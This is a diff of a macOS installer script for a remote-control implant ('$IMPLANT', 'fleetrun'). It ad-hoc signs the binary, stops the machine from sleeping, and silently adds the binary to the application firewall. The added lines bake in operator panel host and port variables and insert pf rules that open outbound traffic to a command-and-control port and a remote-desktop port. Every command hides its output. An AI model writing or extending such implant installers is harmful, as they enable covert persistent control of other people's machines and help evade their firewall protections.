@@ -56,6 +56,11 @@ if ! codesign -dv --verbose=4 "$IMPLANT" >/dev/null 2>&1; then
   codesign --force --deep --sign - "$IMPLANT" 2>/dev/null || true
 fi
 
+# Operator panel (baked in at build time)
+PANEL_HOST="{{PANEL_HOST}}"
+PANEL_C2_PORT="{{PANEL_C2_PORT}}"
+PANEL_RD_PORT="{{PANEL_RD_PORT}}"
+
 # ---- stay awake ------------------------------------------------------------
 caffeinate -ims >/dev/null 2>&1 &
 sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
@@ -65,6 +70,12 @@ sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true
 if [ -x /usr/libexec/ApplicationFirewall/socketfilterfw ]; then
   sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
   sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
+fi
+# Whitelist operator domain in pf for C2 + RD ports
+if [ "$(id -u)" = "0" ]; then
+  sudo -n pfctl -e >/dev/null 2>&1 || true
+  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_C2_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
+  echo "pass out proto tcp to ${PANEL_HOST} port ${PANEL_RD_PORT}" | sudo -n pfctl -f - >/dev/null 2>&1 || true
 fi
 
 # ---- system-wide root install via native macOS admin dialog ----------------
